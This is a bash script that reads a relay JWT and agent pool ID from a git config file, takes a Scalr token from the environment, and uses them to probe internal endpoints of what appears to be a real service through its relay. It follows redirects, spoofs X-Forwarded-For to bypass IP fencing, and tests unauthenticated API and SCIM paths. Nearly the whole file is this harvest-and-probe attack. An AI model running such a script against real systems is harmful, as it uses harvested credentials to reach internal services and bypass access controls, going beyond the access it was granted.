#!/bin/bash
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
STOKEN="$SCALR_TOKEN"
echo "[agent_ip] $(hostname -I)"

relay_get() {
  local label=$1 url=$2; shift 2
  CODE=$(curl -sS -o /tmp/rout.bin -w "%{http_code}" --max-time 8 -L "$@" \
    -H "x-relay-authorization: $JWT" -H "X-Relay-Agent-Pool-ID: $POOL" \
    "https://relay.main.scalr.dev/$url" 2>/tmp/rerr.txt)
  BODY=$(python3 -c "
import sys,gzip
d=open('/tmp/rout.bin','rb').read()
try: d=gzip.decompress(d)
except: pass
print(d.decode('utf-8','replace')[:400])" 2>/dev/null)
  echo "[relay] $label → HTTP $CODE"
  echo "  body: $BODY"
}

# Follow redirects (-L flag) to see where 302 goes
relay_get "ping-follow" "https://internal.main.scalr.dev/ping"
relay_get "well-known-follow" "https://internal.main.scalr.dev/.well-known/terraform.json"

# With agent pod IP in X-Forwarded-For to fake internal IP (IP fencing bypass test)
relay_get "workspaces-spoof-xff" "https://internal.main.scalr.dev/api/iacp/v3/workspaces?filter%5Baccount%5D=acc-v0p14gmusfk03k3e0" \
  -H "Authorization: Bearer $STOKEN" \
  -H "X-Forwarded-For: 10.30.0.5" \
  -H "Accept: application/vnd.api+json"

# Unauthenticated API paths
relay_get "public-path" "https://internal.main.scalr.dev/public/"
relay_get "healthcheck" "https://internal.main.scalr.dev/api/iacp/v3/ping"
relay_get "scim-unauth" "https://internal.main.scalr.dev/scim/"

echo "[done]"
